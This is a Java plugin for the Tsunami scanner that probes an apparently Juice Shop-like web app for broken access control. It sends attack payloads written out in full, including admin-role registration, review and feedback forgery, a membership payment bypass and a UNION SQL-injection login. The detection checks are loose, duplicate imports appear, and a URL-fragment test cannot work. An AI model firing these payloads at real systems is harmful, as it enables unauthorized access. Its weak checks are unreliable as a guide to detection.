/*
 * Copyright 2024 Lukas Pirch
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.raid;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.protobuf.ByteString;
import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Clock;
import java.time.Instant;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.lang.String.format;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "BrokenaccesscontroldetectorDetector",
    version = "0.1",
    description = "Detects BrokenAccessControlDetector vulnerability.",
    author = "Joscha, Elena the Debug Dingos",
    bootstrapModule = BrokenaccesscontroldetectorDetectorBootstrapModule.class)
public final class BrokenaccesscontroldetectorDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final HttpClient httpClient;
  private final Clock utcClock;
  private String token = "";

  @Inject
  public BrokenaccesscontroldetectorDetector(HttpClient httpClient, @UtcClock Clock utcClock) {
    this.httpClient = httpClient;
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Brokenaccesscontroldetector Detector");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    int successfulAttacks = 0;
    
    try {
        com.google.tsunami.common.net.http.HttpHeaders headers = com.google.tsunami.common.net.http.HttpHeaders.builder()
            .addHeader("Accept", "application/json")
            .addHeader("Content-Type", "application/json")
            .build();

        // Test 1: Access administration section without authentication
        HttpResponse adminResponse = httpClient.send(
            HttpRequest.get(targetUri + "/#/administration")
                .setHeaders(headers)
                .build(),
            networkService);
        
        if (adminResponse.status().code() == 200) {
            String adminBody = adminResponse.bodyBytes()
                .map(bs -> bs.toStringUtf8())
                .orElse("");
            if (adminBody.contains("administration") || adminBody.contains("admin")) {
                successfulAttacks++;
            }
        }

        // Test 2: Register user with admin privileges
        String adminUserPayload = "{\"email\":\"testadmin@test.com\",\"password\":\"admin123\",\"role\":\"admin\"}";
        HttpResponse registerResponse = httpClient.send(
            HttpRequest.post(targetUri + "/api/Users")
                .setHeaders(headers)
                .setRequestBody(ByteString.copyFromUtf8(adminUserPayload))
                .build(),
            networkService);
        
        if (registerResponse.status().code() == 201 || registerResponse.status().code() == 200) {
            String registerBody = registerResponse.bodyBytes()
                .map(bs -> bs.toStringUtf8())
                .orElse("");
            if (registerBody.contains("admin") || registerBody.contains("role")) {
                successfulAttacks++;
            }
        }

        // Test 3: Basket manipulation via HTTP Parameter Pollution
        String basketPayload = "{\"ProductId\": 1,\"BasketId\": \"1\",\"quantity\": 1,\"BasketId\": \"2\"}";
        HttpResponse basketResponse = httpClient.send(
            HttpRequest.post(targetUri + "/api/BasketItems")
                .setHeaders(headers)
                .setRequestBody(ByteString.copyFromUtf8(basketPayload))
                .build(),
            networkService);
        
        if (basketResponse.status().code() == 200 || basketResponse.status().code() == 201) {
            successfulAttacks++;
        }

        // Test 4: Feedback submission with manipulated userId
        String feedbackPayload = "{\"comment\":\"Test feedback\",\"rating\":5,\"userId\":\"1\"}";
        HttpResponse feedbackResponse = httpClient.send(
            HttpRequest.post(targetUri + "/api/Feedbacks")
                .setHeaders(headers)
                .setRequestBody(ByteString.copyFromUtf8(feedbackPayload))
                .build(),
            networkService);
        
        if (feedbackResponse.status().code() == 201 || feedbackResponse.status().code() == 200) {
            successfulAttacks++;
        }

        // Test 5: Review manipulation
        String reviewPayload = "{\"message\":\"Test review\",\"author\":\"admin@juice-sh.op\"}";
        HttpResponse reviewResponse = httpClient.send(
            HttpRequest.put(targetUri + "/rest/products/1/reviews")
                .setHeaders(headers)
                .setRequestBody(ByteString.copyFromUtf8(reviewPayload))
                .build(),
            networkService);
        
        if (reviewResponse.status().code() == 200) {
            successfulAttacks++;
        }

        // Test 6: Deluxe membership bypass
        String membershipPayload = "{\"paymentMode\":\"\"}";
        HttpResponse membershipResponse = httpClient.send(
            HttpRequest.post(targetUri + "/api/Memberships")
                .setHeaders(headers)
                .setRequestBody(ByteString.copyFromUtf8(membershipPayload))
                .build(),
            networkService);
        
        if (membershipResponse.status().code() == 200 || membershipResponse.status().code() == 201) {
            successfulAttacks++;
        }

        // Test 7: Data export vulnerability
        HttpResponse exportResponse = httpClient.send(
            HttpRequest.get(targetUri + "/api/Users/1/data-export")
                .setHeaders(headers)
                .build(),
            networkService);
        
        if (exportResponse.status().code() == 200) {
            String exportBody = exportResponse.bodyBytes()
                .map(bs -> bs.toStringUtf8())
                .orElse("");
            if (exportBody.contains("orders") || exportBody.contains("data")) {
                successfulAttacks++;
            }
        }

        // Test 8: SQL injection for accountant login
        String sqlPayload = "' UNION SELECT 15 as id, '' as username, 'acc0unt4nt@juice-sh.op' as email, '12345' as password, 'accounting' as role--";
        String loginPayload = "{\"email\":\"" + sqlPayload + "\",\"password\":\"12345\"}";
        HttpResponse loginResponse = httpClient.send(
            HttpRequest.post(targetUri + "/rest/user/login")
                .setHeaders(headers)
                .setRequestBody(ByteString.copyFromUtf8(loginPayload))
                .build(),
            networkService);
        
        if (loginResponse.status().code() == 200) {
            String loginBody = loginResponse.bodyBytes()
                .map(bs -> bs.toStringUtf8())
                .orElse("");
            if (loginBody.contains("token") || loginBody.contains("authentication")) {
                successfulAttacks++;
            }
        }

        return successfulAttacks > 0;
        
    } catch (IOException e) {
        logger.atWarning().log(
            format("Broken access control test failed on '%s': %s", networkService, e.getMessage()));
        return false;
    }
}

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(
            Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("BROKENACCESSCONTROLDETECTOR_VULNERABILITY"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("BrokenAccessControlDetector Vulnerability Exposed")
                .setDescription("The application is vulnerable to BrokenAccessControlDetector attacks.")
                .setRecommendation(
                    "Implement proper security measures to prevent broken access control attacks."))
        .build();
  }
  
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("BROKENACCESSCONTROLDETECTOR_VULNERABILITY"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("BrokenAccessControlDetector Vulnerability Exposed")
            .setDescription(
                "The application is vulnerable to BrokenAccessControlDetector attacks.")
            .setRecommendation(
                "Implement proper security measures to prevent broken access control attacks.")
        .build());
  }
}